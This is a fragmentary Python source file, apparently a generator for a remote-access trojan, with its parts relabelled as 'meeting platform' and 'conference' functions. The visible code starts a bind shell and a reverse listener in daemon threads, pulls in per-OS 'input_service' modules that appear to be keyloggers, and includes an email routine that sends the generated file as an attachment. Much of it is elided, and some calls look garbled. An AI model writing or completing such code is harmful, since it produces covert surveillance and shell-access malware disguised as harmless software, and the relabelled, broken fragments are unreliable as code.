...
################################################################################
#                       st_main.py meeting_platform_gen variables                        #
################################################################################

main_imports = '''#!/usr/bin/env python
from st_utils import *

class meeting_client():

    connected = False
'''

def add_meeting_host(BHOST,BPORT):
    return '''
    def meeting_host(self):
        client_socket=None
        self.stop_meeting_host = False
        ...
        while True:
            ...
            if client_socket:
                if not self.connected:
                    ...
                    send(client_socket,"[!] Another meeting_platform shell has already been established.\\n")
                    client_socket.close()
            client_socket=None
        server.close()

    def halt_meeting_host(self):
        self.stop_meeting_host = True\n\n'''.format(BHOST,BPORT)

def add_conference_listener(LHOST,LPORT):
    return '''
    def conference_listener(self):
        self.stop_conference_listener  = False
        while True:
            if self.stop_conference_listener :
                break
    ...
    def halt_conference_listener(self):
        self.stop_conference_listener = True\n\n'''.format(LHOST,LPORT)
...
def main():
    if not meeting_platform_running():
        ...
        try:
            bind = threading.Thread(target=st_pyld.meeting_host, args=())
            listen = threading.Thread(target=st_pyld.conference_listener, args=())
            bind.daemon = True
            listen.daemon = True
            bind.start()
            listen.start()
            ...
            if dbg:
                print e
            pass
        st_pyld.halt_meeting_host()
        st_pyld.halt_conference_listener()
...
def start_meeting_client():
    ...
    def run_background_operations():
        try:
            ...
            # Start normal client_app operations
            if not meeting_platform_running():
                st_pyld = meeting_platform_client_app()
...
'''
################################################################################
#                       st_utils.py meeting_platform_gen variables                       #
################################################################################
...
from st_win_input_service import *
...
from st_osx_input_service import *
...
from st_lnx_input_service import *\n
'''

################################################################################
#                       st_encryption.py meeting_platform_gen variables                  #
################################################################################
...
################################################################################
#                       st_protocol.py meeting_platform_gen variables                    #
################################################################################
...
################################################################################
#                       st_win_input_service.py meeting_platform_gen variables               #
################################################################################

def get_win_input_service():
    return '''
import os
import sys
import time
...
################################################################################
#                       st_osx_input_service.py meeting_platform_gen variables               #
################################################################################

def get_osx_input_service():
    return '''
import re
import time
import datetime
...
################################################################################
#                       st_lnx_input_service.py meeting_platform_gen variables               #
################################################################################

def get_lnx_input_service():
    return '''
import os
import sys
import time
...
################################################################################
#                        meeting_platform_gen email implementation                       #
################################################################################
...
if attachment:
    ...
    part.set_client_app((attachment).read())
...
################################################################################
#                       st_requirments.py meeting_platform_gen variables                 #
################################################################################
